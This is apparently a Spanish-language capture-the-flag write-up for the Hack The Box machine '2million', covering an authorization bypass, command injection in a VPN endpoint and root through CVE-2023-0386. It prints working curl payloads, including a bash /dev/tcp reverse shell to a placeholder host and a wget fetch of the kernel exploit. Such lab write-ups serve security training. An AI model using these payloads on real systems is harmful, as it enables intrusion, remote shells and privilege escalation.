## 1. Reconnaissance

nmap -sV -sC -p- 10.129.229.66

Se agrega `2million.htb` al `/etc/hosts` y se accede vía browser.

## 2. Web Enumeration & Invite Code

La página requiere un invite code para registrarse. Inspeccionando el JS de `/invite`:

```bash
curl -s http://2million.htb/js/inviteapi.min.js
```

El JS está ofuscado con **Dean Edwards packer**. Al desofuscarlo se identifican dos funciones: `makeInviteCode` y `verifyInviteCode`, y los endpoints correspondientes:

- POST `/api/v1/invite/how/to/generate`
- POST `/api/v1/invite/generate`

```bash
curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate
# Respuesta: string encodado en ROT13 con instrucciones

curl -s -X POST http://2million.htb/api/v1/invite/generate
# Respuesta: invite code en base64
```

Se decodifica el base64, se usa el código para registrarse y se inicia sesión.

## 3. API Enumeration

```bash
curl -s http://2million.htb/api/v1 -H "Cookie: PHPSESSID=<session>"
```

La API lista todos los endpoints disponibles. Se identifican rutas de **admin**:

- GET `/api/v1/admin/auth`
- PUT `/api/v1/admin/settings/update`
- POST `/api/v1/admin/vpn/generate`

---

## 4. Privilege Escalation a Admin (IDOR / Missing Authorization)

El endpoint PUT `/api/v1/admin/settings/update` no valida si el usuario que llama tiene permisos de admin — permite modificar el campo `is_admin` de cualquier cuenta:

```bash
curl -s -X PUT http://2million.htb/api/v1/admin/settings/update \
  -H "Cookie: PHPSESSID=<session>" \
  -H "Content-Type: application/json" \
  -d '{"email":"vale@gmail.com","is_admin":1}'
```

**Lección:** Siempre probar endpoints admin con tu propia sesión — falta de autorización server-side es un fallo crítico aunque el frontend lo oculte.

---

## 5. Remote Code Execution (Command Injection)

El endpoint POST `/api/v1/admin/vpn/generate` recibe un `username` y lo pasa directamente a un comando shell del sistema (probablemente `generate_vpn.sh <username>`) sin sanitización.

**Prueba de concepto:**

```bash
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -H "Cookie: PHPSESSID=<session>" \
  -H "Content-Type: application/json" \
  -d '{"username":"vale;id;"}'
# Output: uid=33(www-data)
```

**Lección clave:** Si hay RCE vía command injection → hay reverse shell. El paso es siempre el mismo: confirmar ejecución de comandos → establecer canal interactivo.

## 6. Reverse Shell

```bash
# Listener en Kali
nc -lvnp 4444

# Payload
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -H "Cookie: PHPSESSID=<session>" \
  -H "Content-Type: application/json" \
  -d '{"username":"vale;bash -c '\''bash -i >& /dev/tcp/<TUN0_IP>/4444 0>&1'\'';"}' 
```

Shell obtenida como `www-data`.

## 7. Lateral Movement: www-data → admin

Credenciales expuestas en archivo de configuración:

```bash
cat /var/www/html/.env
# DB_USERNAME=admin
# DB_PASSWORD=SuperDuperPass123
```

```bash
su admin  # Password: SuperDuperPass123
```

**Lección:** Siempre revisar `.env`, `config.php`, y archivos similares al obtener acceso al filesystem — las credenciales de BD suelen reutilizarse como credenciales de sistema.

**Flag de user obtenida:** `/home/admin/user.txt`

## 8. Privilege Escalation a Root (CVE-2023-0386)

**Enumeración:**

```bash
uname -a
# Linux 2million 5.15.70-051570-generic

cat /var/mail/admin
# Mail interno menciona explícitamente CVE de OverlayFS/FUSE
```

**Kernel 5.15.70 (Sept 2022)** es vulnerable a **CVE-2023-0386**, una vulnerabilidad en el subsistema OverlayFS que permite a un usuario sin privilegios escalar a root mediante manipulación de atributos de archivos SUID en filesystems montados con FUSE.

```bash
# En Kali: compilar y servir el exploit
make all
zip -r CVE-2023-0386.zip CVE-2023-0386/
python3 -m http.server 8080

# En la víctima
wget http://<TUN0_IP>:8080/CVE-2023-0386.zip
unzip CVE-2023-0386.zip
cd CVE-2023-0386
make all
./exp
```

**Flag de root obtenida:** `/root/root.txt`

## Puntos de mejora

**Estancamiento 1 — Invite code:** El JS ofuscado puede intimidar, pero el array de strings del packer siempre revela los identificadores clave. Antes de desofuscar completamente, leer ese array es suficiente.

**Estancamiento 2 — Command injection:** Probaste primero `vale;id` sin el `;` final — muchos payloads requieren cerrar el comando anterior Y el inyectado. Siempre probar variantes: `;cmd;`, `` `cmd` ``, `$(cmd)`.

**Estancamiento 3 — VPN falso:** Intentaste conectarte con el `.ovpn` generado. Recordar que en CTFs, los archivos generados por endpoints sospechosos son vectores de ataque, no funcionalidad real.
